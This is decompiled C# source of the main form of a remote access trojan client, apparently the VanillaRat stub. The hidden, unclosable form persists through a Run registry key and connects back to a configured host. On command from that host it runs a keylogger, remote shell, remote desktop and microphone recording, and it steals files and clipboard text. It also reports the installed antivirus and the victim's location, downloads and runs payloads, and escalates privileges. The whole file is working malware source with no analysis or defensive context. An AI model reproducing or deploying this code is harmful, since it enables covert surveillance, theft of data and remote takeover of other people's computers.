using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Speech.Synthesis;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using VanillaRatStub;
using VanillaStub.Helpers.Information;
using VanillaStub.Helpers.Networking;
using VanillaStub.Helpers.Services;
using VanillaStub.Helpers.Services.InputSimulator;
using VanillaStub.Helpers.Telepathy;

namespace VanillaStub.Forms;

public class InitialForm : Form
{
	internal struct INPUT
	{
		public uint Type;

		public MOUSEKEYBDHARDWAREINPUT Data;
	}

	[StructLayout(LayoutKind.Explicit)]
	internal struct MOUSEKEYBDHARDWAREINPUT
	{
		[FieldOffset(0)]
		public MOUSEINPUT Mouse;
	}

	internal struct MOUSEINPUT
	{
		public int X;

		public int Y;

		public uint MouseData;

		public uint Flags;

		public uint Time;

		public IntPtr ExtraInfo;
	}

	public const int WM_LBUTTONDOWN = 513;

	public const int WM_LBUTTONUP = 514;

	public const int WM_LBUTTONDBLCLK = 515;

	public const int WM_RBUTTONDOWN = 516;

	public const int WM_RBUTTONUP = 517;

	public const int WM_RBUTTONDBLCLK = 518;

	private readonly int Interval;

	private readonly int Port;

	private readonly bool Install;

	private readonly bool Startup;

	private bool ReceivingFile;

	private bool UpdateMode;

	private bool APActive;

	private bool ARActive;

	private bool SLActive;

	private string CurrentDirectory;

	private string FileToWrite;

	private string UpdateFileName;

	private readonly string InstallPath;

	private readonly string AudioPath;

	private readonly Chat C = new Chat();

	private readonly ScreenLock SL = new ScreenLock();

	private IContainer components;

	private async void ConnectLoop()
	{
		while (!Networking.MainClient.Connected)
		{
			await Task.Delay(50);
			Networking.MainClient.Connect(ClientSettings.DNS, Port);
		}
		while (Networking.MainClient.Connected)
		{
			await Task.Delay(Interval);
			GetData();
		}
		ConnectLoop();
	}

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int mciSendStringA(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);

	private void UninstallClient()
	{
		if (Install && Startup)
		{
			Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue(Path.GetFileNameWithoutExtension(Application.get_ExecutablePath()), throwOnMissingValue: false);
		}
	}

	private void InstallClient()
	{
		if (!Install)
		{
			return;
		}
		if (Application.get_ExecutablePath() == InstallPath)
		{
			if (Startup)
			{
				RegistryKey? registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				registryKey!.DeleteValue(Path.GetFileNameWithoutExtension(Application.get_ExecutablePath()), throwOnMissingValue: false);
				registryKey!.SetValue(Path.GetFileNameWithoutExtension(Application.get_ExecutablePath()), InstallPath);
			}
		}
		else
		{
			File.Copy(Application.get_ExecutablePath(), InstallPath, overwrite: true);
			Process.Start(InstallPath);
			Process.GetCurrentProcess().Kill();
		}
	}

	private bool NetUpdated()
	{
		string name = "SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full\\";
		return (int)RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32).OpenSubKey(name)!.GetValue("Release") >= 378389;
	}

	public InitialForm()
	{
		InitializeComponent();
		if (!NetUpdated())
		{
			Process.Start("dotnetfx.exe");
		}
		Interval = Convert.ToInt16(ClientSettings.UpdateInterval);
		Port = Convert.ToInt16(ClientSettings.Port);
		if (string.Equals(ClientSettings.Install, "true", StringComparison.OrdinalIgnoreCase))
		{
			Install = true;
		}
		if (string.Equals(ClientSettings.Startup, "true", StringComparison.OrdinalIgnoreCase))
		{
			Startup = true;
		}
		InstallPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + AppDomain.CurrentDomain.FriendlyName;
		AudioPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments) + "\\micaudio.wav";
		InstallClient();
	}

	private void OnClosing(object sender, FormClosingEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and I4
		if ((int)e.get_CloseReason() == 3)
		{
			((CancelEventArgs)(object)e).Cancel = true;
		}
	}

	private void OnLoad(object sender, EventArgs e)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		((Control)this).BeginInvoke((Delegate)(MethodInvoker)delegate
		{
			((Control)this).Hide();
		});
	}

	private void OnShow(object sender, EventArgs e)
	{
		ConnectLoop();
	}

	private void GetData()
	{
		Message message;
		while (Networking.MainClient.GetNextMessage(out message))
		{
			switch (message.eventType)
			{
			case EventType.Connected:
			{
				Console.WriteLine("Connected");
				List<byte> list = new List<byte>();
				list.Add(2);
				list.AddRange(Encoding.ASCII.GetBytes(ClientSettings.ClientTag));
				Networking.MainClient.Send(list.ToArray());
				list.Clear();
				list.Add(14);
				list.AddRange(Encoding.ASCII.GetBytes(ComputerInfo.GetAntivirus()));
				Networking.MainClient.Send(list.ToArray());
				string s = ComputerInfo.GetWindowsVersion().Remove(ComputerInfo.GetWindowsVersion().IndexOf('('));
				list.Clear();
				list.Add(15);
				list.AddRange(Encoding.ASCII.GetBytes(s));
				Networking.MainClient.Send(list.ToArray());
				break;
			}
			case EventType.Data:
				HandleData(message.data);
				break;
			}
		}
	}

	[SecurityPermission(SecurityAction.Demand, ControlThread = true)]
	private void HandleData(byte[] RawData)
	{
		if (ReceivingFile)
		{
			try
			{
				if (UpdateMode)
				{
					try
					{
						File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + UpdateFileName, RawData);
						Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + UpdateFileName);
						KillClient();
						return;
					}
					catch
					{
						return;
					}
				}
				string text = CurrentDirectory;
				if (text.Equals("BaseDirectory"))
				{
					text = Path.GetPathRoot(Environment.SystemDirectory);
				}
				File.WriteAllBytes(FileToWrite, RawData);
				string text2 = string.Empty;
				DirectoryInfo directoryInfo = new DirectoryInfo(text);
				DirectoryInfo[] directories = directoryInfo.GetDirectories();
				foreach (DirectoryInfo directoryInfo2 in directories)
				{
					text2 = text2 + "][{" + directoryInfo2.FullName + "}<Directory>[" + directoryInfo2.CreationTime.ToString() + "]";
				}
				FileInfo[] files = directoryInfo.GetFiles();
				foreach (FileInfo fileInfo in files)
				{
					text2 = text2 + "][{" + Path.GetFileNameWithoutExtension(fileInfo.FullName) + "}<" + fileInfo.Extension + ">[" + fileInfo.CreationTime.ToString() + "]";
				}
				List<byte> list = new List<byte>();
				list.Add(5);
				list.AddRange(Encoding.ASCII.GetBytes(text2));
				Networking.MainClient.Send(list.ToArray());
				list.Clear();
				list.Add(1);
				list.AddRange(Encoding.ASCII.GetBytes("The file " + Path.GetFileName(FileToWrite) + " was uploaded."));
				Networking.MainClient.Send(list.ToArray());
			}
			catch
			{
			}
			ReceivingFile = false;
			return;
		}
		string text3 = string.Empty;
		try
		{
			text3 = Encoding.ASCII.GetString(RawData);
		}
		catch
		{
		}
		switch (text3)
		{
		case "GetProcesses":
			GetProcesses();
			break;
		case "StopAR":
			StopAR();
			break;
		case "ToggleScreenlock":
			ToggleScreenlock();
			break;
		case "GoUpDir":
			GoUpDir();
			break;
		case "OpenChat":
			OpenChat();
			break;
		case "StopRD":
			StopRD();
			break;
		case "StopRS":
			StopRS();
			break;
		case "CloseChat":
			CloseChat();
			break;
		case "StartRS":
			StartRS();
			break;
		case "GetClipboard":
			GetClipboard();
			break;
		case "GetComputerInfo":
			GetComputerInfo();
			break;
		case "StartAR":
			StartAR();
			break;
		case "StopUsageStream":
			StopUsageStream();
			break;
		case "KillClient":
			KillClient();
			break;
		case "StartKL":
			StartKL();
			break;
		case "StartRD":
			StartRD();
			break;
		case "GetStoredPasswords":
			GetPasswords();
			break;
		case "DisconnectClient":
			DisconnectClient();
			break;
		case "StartUsageStream":
			StartUsageStream();
			break;
		case "ToggleAntiProcess":
			ToggleAntiProcess();
			break;
		case "RaisePerms":
			RaisePerms();
			break;
		case "StopKL":
			StopKL();
			break;
		}
		if (text3.Contains("MsgBox"))
		{
			MsgBox(text3);
		}
		else if (text3.Contains("EndProcess"))
		{
			EndProcess(text3);
		}
		else if (text3.Contains("OpenWebsite"))
		{
			OpenWebsite(text3);
		}
		else if (text3.Contains("GetDF"))
		{
			GetDF(text3);
		}
		else if (text3.Contains("GetFile"))
		{
			GetFile(text3);
		}
		else if (text3.Contains("StartFileReceive"))
		{
			StartFileReceive(text3);
		}
		else if (text3.Contains("TryOpen"))
		{
			TryOpen(text3);
		}
		else if (text3.Contains("DeleteFile"))
		{
			DeleteFile(text3);
		}
		else if (text3.Contains("[<MESSAGE>]"))
		{
			Message(text3.Replace("[<MESSAGE>]", ""));
		}
		else if (text3.Contains("[<TTS>]"))
		{
			TTS(text3.Replace("[<TTS>]", ""));
		}
		else if (text3.Contains("[<COMMAND>]"))
		{
			Command(text3.Replace("[<COMMAND>]", ""));
		}
		else if (text3.Contains("[<MOUSE>]"))
		{
			MouseClick(text3);
		}
	}

	private void KillClient()
	{
		KeyloggerStream.Stop();
		UninstallClient();
		try
		{
			Process.GetCurrentProcess().Kill();
		}
		catch
		{
			Environment.Exit(0);
		}
	}

	private void DisconnectClient()
	{
		Networking.MainClient.Disconnect();
	}

	private void ToggleScreenlock()
	{
		if (!SLActive)
		{
			SLActive = true;
			Cursor.Hide();
			List<byte> list = new List<byte>();
			list.Add(1);
			list.AddRange(Encoding.ASCII.GetBytes("Started screen locker."));
			Networking.MainClient.Send(list.ToArray());
			if (!((Control)SL).get_Visible())
			{
				((Control)SL).Show();
			}
		}
		else
		{
			SLActive = false;
			Cursor.Show();
			List<byte> list2 = new List<byte>();
			list2.Add(1);
			list2.AddRange(Encoding.ASCII.GetBytes("Stopped screen locker."));
			Networking.MainClient.Send(list2.ToArray());
			if (((Control)SL).get_Visible())
			{
				((Control)SL).Hide();
			}
		}
	}

	private void GetProcesses()
	{
		Process[] processes = Process.GetProcesses();
		List<string> list = new List<string>();
		Process[] array = processes;
		foreach (Process process in array)
		{
			list.Add("{" + process.ProcessName + "}<" + process.Id + ">[" + process.MainWindowTitle + "]");
		}
		string[] array2 = Enumerable.ToArray(list);
		List<byte> list2 = new List<byte> { 3 };
		string text = "";
		string[] array3 = array2;
		foreach (string text2 in array3)
		{
			text = text + "][" + text2;
		}
		list2.AddRange(Encoding.ASCII.GetBytes(text));
		Networking.MainClient.Send(list2.ToArray());
	}

	private void RaisePerms()
	{
		Process process = new Process();
		process.StartInfo.FileName = Application.get_ExecutablePath();
		process.StartInfo.UseShellExecute = true;
		process.StartInfo.Verb = "runas";
		process.Start();
		try
		{
			Process.GetCurrentProcess().Kill();
		}
		catch
		{
			Environment.Exit(0);
		}
	}

	private void MouseClick(string MouseArgs)
	{
		int x = Convert.ToInt16(GetSubstringByString("[<X>]", "[<\\X>]", MouseArgs));
		int y = Convert.ToInt16(GetSubstringByString("[<Y>]", "[<\\Y>]", MouseArgs));
		Point position = new Point(x, y);
		InputSimulator inputSimulator = new InputSimulator();
		if (GetSubstringByString("[<MOUSE>]", "[<\\MOUSE>]", MouseArgs) == "DOUBLE")
		{
			Cursor.set_Position(position);
			inputSimulator.Mouse.LeftButtonDoubleClick();
		}
		else if (GetSubstringByString("[<MOUSE>]", "[<\\MOUSE>]", MouseArgs) == "SINGLE-LEFT")
		{
			Cursor.set_Position(position);
			inputSimulator.Mouse.LeftButtonClick();
		}
		else if (GetSubstringByString("[<MOUSE>]", "[<\\MOUSE>]", MouseArgs) == "SINGLE-RIGHT")
		{
			Cursor.set_Position(position);
			inputSimulator.Mouse.RightButtonClick();
		}
	}

	private void MsgBox(string Data)
	{
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Unknown result type (might be due to invalid IL or missing references)
		//IL_006d: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0091: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_0104: Unknown result type (might be due to invalid IL or missing references)
		//IL_0117: Unknown result type (might be due to invalid IL or missing references)
		//IL_012a: Unknown result type (might be due to invalid IL or missing references)
		//IL_013c: Unknown result type (might be due to invalid IL or missing references)
		//IL_014f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0162: Unknown result type (might be due to invalid IL or missing references)
		//IL_0175: Unknown result type (might be due to invalid IL or missing references)
		//IL_0178: Unknown result type (might be due to invalid IL or missing references)
		//IL_017a: Unknown result type (might be due to invalid IL or missing references)
		//IL_017c: Unknown result type (might be due to invalid IL or missing references)
		string substringByString = GetSubstringByString("<{", "}>", Data);
		string substringByString2 = GetSubstringByString("<", ">", substringByString);
		string substringByString3 = GetSubstringByString("[", "]", substringByString);
		string substringByString4 = GetSubstringByString("{", "}", substringByString);
		string substringByString5 = GetSubstringByString("/", "\\", substringByString);
		MessageBoxButtons val = (MessageBoxButtons)0;
		MessageBoxIcon val2 = (MessageBoxIcon)0;
		if (substringByString4.Equals("Abort Retry Ignore"))
		{
			val = (MessageBoxButtons)2;
		}
		else if (substringByString4.Equals("OK"))
		{
			val = (MessageBoxButtons)0;
		}
		else if (substringByString4.Equals("OK Cancel"))
		{
			val = (MessageBoxButtons)1;
		}
		else if (substringByString4.Equals("Retry Cancel"))
		{
			val = (MessageBoxButtons)5;
		}
		else if (substringByString4.Equals("Yes No"))
		{
			val = (MessageBoxButtons)4;
		}
		else if (substringByString4.Equals("Yes No Cancel"))
		{
			val = (MessageBoxButtons)3;
		}
		if (substringByString5.Equals("Asterisk"))
		{
			val2 = (MessageBoxIcon)64;
		}
		else if (substringByString5.Equals("Error"))
		{
			val2 = (MessageBoxIcon)16;
		}
		else if (substringByString5.Equals("Exclamation"))
		{
			val2 = (MessageBoxIcon)48;
		}
		else if (substringByString5.Equals("Hand"))
		{
			val2 = (MessageBoxIcon)16;
		}
		else if (substringByString5.Equals("Information"))
		{
			val2 = (MessageBoxIcon)64;
		}
		else if (substringByString5.Equals("None"))
		{
			val2 = (MessageBoxIcon)0;
		}
		else if (substringByString5.Equals("Question"))
		{
			val2 = (MessageBoxIcon)32;
		}
		else if (substringByString5.Equals("Stop"))
		{
			val2 = (MessageBoxIcon)16;
		}
		else if (substringByString5.Equals("Warning"))
		{
			val2 = (MessageBoxIcon)48;
		}
		MessageBox.Show(substringByString2, substringByString3, val, val2);
	}

	private void TTS(string Message)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		try
		{
			SpeechSynthesizer val = new SpeechSynthesizer();
			try
			{
				val.SetOutputToDefaultAudioDevice();
				val.Speak(Message);
				List<byte> list = new List<byte>();
				list.Add(1);
				list.AddRange(Encoding.ASCII.GetBytes("The message " + Message + " was played."));
				Networking.MainClient.Send(list.ToArray());
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
	}

	private void EndProcess(string Data)
	{
		string substringByString = GetSubstringByString("<{", "}>", Data);
		try
		{
			Process processById = Process.GetProcessById(Convert.ToInt16(substringByString));
			processById.Kill();
			List<byte> list = new List<byte>();
			list.Add(1);
			list.AddRange(Encoding.ASCII.GetBytes("The process " + processById.ProcessName + " was killed."));
			Networking.MainClient.Send(list.ToArray());
		}
		catch
		{
		}
	}

	private void OpenWebsite(string Data)
	{
		string substringByString = GetSubstringByString("<{", "}>", Data);
		try
		{
			Process.Start(substringByString);
			List<byte> list = new List<byte>();
			list.Add(1);
			list.AddRange(Encoding.ASCII.GetBytes("The website " + substringByString + " was opened."));
			Networking.MainClient.Send(list.ToArray());
		}
		catch
		{
		}
	}

	private void GetDF(string Data)
	{
		try
		{
			string text = GetSubstringByString("{", "}", Data);
			if (text.Equals("BaseDirectory"))
			{
				text = Path.GetPathRoot(Environment.SystemDirectory);
			}
			string text2 = string.Empty;
			DirectoryInfo directoryInfo = new DirectoryInfo(text);
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				text2 = text2 + "][{" + directoryInfo2.FullName + "}<Directory>[" + directoryInfo2.CreationTime.ToString() + "]";
			}
			FileInfo[] files = directoryInfo.GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				text2 = text2 + "][{" + Path.GetFileNameWithoutExtension(fileInfo.FullName) + "}<" + fileInfo.Extension + ">[" + fileInfo.CreationTime.ToString() + "]";
			}
			List<byte> list = new List<byte>();
			list.Add(5);
			list.AddRange(Encoding.ASCII.GetBytes(text2));
			Networking.MainClient.Send(list.ToArray());
			CurrentDirectory = text;
			list.Clear();
			list.Add(6);
			list.AddRange(Encoding.ASCII.GetBytes(CurrentDirectory));
			Networking.MainClient.Send(list.ToArray());
		}
		catch
		{
		}
	}

	private void GetFile(string Data)
	{
		try
		{
			byte[] array;
			using (FileStream fileStream = new FileStream(GetSubstringByString("{[", "]}", Data), FileMode.Open))
			{
				array = new byte[fileStream.Length];
				fileStream.Read(array, 0, array.Length);
			}
			List<byte> list = new List<byte>();
			list.Add(8);
			list.AddRange(array);
			Networking.MainClient.Send(list.ToArray());
		}
		catch (Exception ex)
		{
			List<byte> list2 = new List<byte>();
			list2.Add(1);
			list2.AddRange(Encoding.ASCII.GetBytes("Error Downloading: " + ex.Message + ")"));
			Networking.MainClient.Send(list2.ToArray());
		}
	}

	private void StartFileReceive(string Data)
	{
		try
		{
			Random random = new Random();
			FileToWrite = GetSubstringByString("{", "}", Data);
			if (FileToWrite.Contains("[UPDATE]"))
			{
				UpdateMode = true;
				UpdateFileName = FileToWrite.Replace("[UPDATE]", "");
				if (UpdateFileName == AppDomain.CurrentDomain.FriendlyName)
				{
					UpdateFileName = "Updated" + random.Next(0, 1000);
				}
			}
			ReceivingFile = true;
		}
		catch
		{
		}
	}

	private void TryOpen(string Data)
	{
		string substringByString = GetSubstringByString("{", "}", Data);
		try
		{
			Process.Start(substringByString);
			List<byte> list = new List<byte>();
			list.Add(1);
			list.AddRange(Encoding.ASCII.GetBytes("The file " + Path.GetFileName(substringByString) + " was opened."));
			Networking.MainClient.Send(list.ToArray());
		}
		catch
		{
		}
	}

	private void DeleteFile(string Data)
	{
		try
		{
			string substringByString = GetSubstringByString("{", "}", Data);
			File.Delete(substringByString);
			List<byte> list = new List<byte>();
			list.Add(1);
			list.AddRange(Encoding.ASCII.GetBytes("The file " + Path.GetFileName(substringByString) + " was deleted."));
			Networking.MainClient.Send(list.ToArray());
			GetDF(CurrentDirectory);
		}
		catch
		{
		}
	}

	private void Message(string Message)
	{
		if (((Control)C).get_Visible())
		{
			if (!string.IsNullOrWhiteSpace(((Control)C.txtChat).get_Text()))
			{
				((TextBoxBase)C.txtChat).AppendText(Environment.NewLine + "Admin: " + Message);
			}
			else
			{
				((Control)C.txtChat).set_Text("Admin: " + Message);
			}
		}
	}

	private void Command(string Command)
	{
		RemoteShellStream.WriteLine = true;
		RemoteShellStream.Input = Command;
	}

	private void GetComputerInfo()
	{
		string text = "";
		List<string> list = new List<string>();
		try
		{
			ComputerInfo.GetGeoInfo();
		}
		catch
		{
		}
		list.Add("Computer Name: " + ComputerInfo.GetName());
		list.Add("Computer CPU: " + ComputerInfo.GetCPU());
		list.Add("Computer GPU: " + ComputerInfo.GetGPU());
		list.Add("Computer Ram Amount (MB): " + ComputerInfo.GetRamAmount());
		list.Add("Computer Antivirus: " + ComputerInfo.GetAntivirus());
		list.Add("Computer OS: " + ComputerInfo.GetWindowsVersion());
		list.Add("Country: " + ComputerInfo.GeoInfo.Country);
		list.Add("Region Name: " + ComputerInfo.GeoInfo.RegionName);
		list.Add("City: " + ComputerInfo.GeoInfo.City);
		string[] array = list.ToArray();
		foreach (string text2 in array)
		{
			text = text + "," + text2;
		}
		List<byte> list2 = new List<byte>();
		list2.Add(4);
		list2.AddRange(Encoding.ASCII.GetBytes(text));
		Networking.MainClient.Send(list2.ToArray());
	}

	private void GetPasswords()
	{
	}

	private void GoUpDir()
	{
		try
		{
			List<byte> list = new List<byte>();
			list.Add(7);
			CurrentDirectory = Directory.GetParent(CurrentDirectory)!.ToString();
			list.AddRange(Encoding.ASCII.GetBytes(CurrentDirectory));
			Networking.MainClient.Send(list.ToArray());
		}
		catch
		{
		}
	}

	private void GetClipboard()
	{
		try
		{
			string ClipboardText = "Clipboard is empty or contains an invalid data type.";
			Thread thread = new Thread((ThreadStart)delegate
			{
				if (Clipboard.ContainsText((TextDataFormat)0))
				{
					ClipboardText = Clipboard.GetText((TextDataFormat)0);
				}
			});
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start();
			thread.Join();
			List<byte> list = new List<byte>();
			list.Add(9);
			list.AddRange(Encoding.ASCII.GetBytes(ClipboardText));
			Networking.MainClient.Send(list.ToArray());
		}
		catch
		{
		}
	}

	private void ToggleAntiProcess()
	{
		if (!APActive)
		{
			APActive = true;
			AntiProcess.StartBlock();
			List<byte> list = new List<byte>();
			list.Add(1);
			list.AddRange(Encoding.ASCII.GetBytes("Started Anti-Process."));
			Networking.MainClient.Send(list.ToArray());
		}
		else if (APActive)
		{
			APActive = false;
			AntiProcess.StopBlock();
			List<byte> list2 = new List<byte>();
			list2.Add(1);
			list2.AddRange(Encoding.ASCII.GetBytes("Stopped Anti-Process."));
			Networking.MainClient.Send(list2.ToArray());
		}
	}

	private void StartRS()
	{
		RemoteShellStream.Start();
	}

	private void StopRS()
	{
		RemoteShellStream.Stop();
	}

	private void StartUsageStream()
	{
		HardwareUsageStream.Start();
	}

	private void StopUsageStream()
	{
		HardwareUsageStream.Stop();
	}

	private void StartRD()
	{
		RemoteDesktopStream.Start();
	}

	private void StopRD()
	{
		RemoteDesktopStream.Stop();
	}

	private void StartKL()
	{
		KeyloggerStream.Start();
	}

	private void StopKL()
	{
		KeyloggerStream.Stop();
	}

	private void OpenChat()
	{
		if (!((Control)C).get_Visible())
		{
			((Control)C).Show();
		}
	}

	private void CloseChat()
	{
		if (((Control)C).get_Visible())
		{
			((Control)C).Hide();
		}
	}

	private void StartAR()
	{
		try
		{
			if (!ARActive)
			{
				mciSendStringA("open new Type waveaudio Alias recsound", "", 0, 0);
				mciSendStringA("record recsound", "", 0, 0);
				if (File.Exists(AudioPath))
				{
					File.Delete(AudioPath);
				}
				ARActive = true;
			}
		}
		catch
		{
		}
	}

	private void StopAR()
	{
		try
		{
			if (ARActive)
			{
				mciSendStringA("save recsound " + AudioPath, "", 0, 0);
				mciSendStringA("close recsound", "", 0, 0);
				Thread.Sleep(100);
				byte[] array;
				using (FileStream fileStream = new FileStream(AudioPath, FileMode.Open))
				{
					array = new byte[fileStream.Length];
					fileStream.Read(array, 0, array.Length);
				}
				List<byte> list = new List<byte>();
				list.Add(13);
				list.AddRange(array);
				Networking.MainClient.Send(list.ToArray());
				File.Delete(AudioPath);
				ARActive = false;
			}
		}
		catch
		{
		}
	}

	private string GetSubstringByString(string a, string b, string c)
	{
		try
		{
			return c.Substring(c.IndexOf(a) + a.Length, c.IndexOf(b) - c.IndexOf(a) - a.Length);
		}
		catch
		{
			return "";
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_006e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0078: Expected O, but got Unknown
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(120, 0));
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("InitialForm");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).add_FormClosing(new FormClosingEventHandler(OnClosing));
		((Form)this).add_Load((EventHandler)OnLoad);
		((Form)this).add_Shown((EventHandler)OnShow);
		((Control)this).ResumeLayout(false);
	}
}
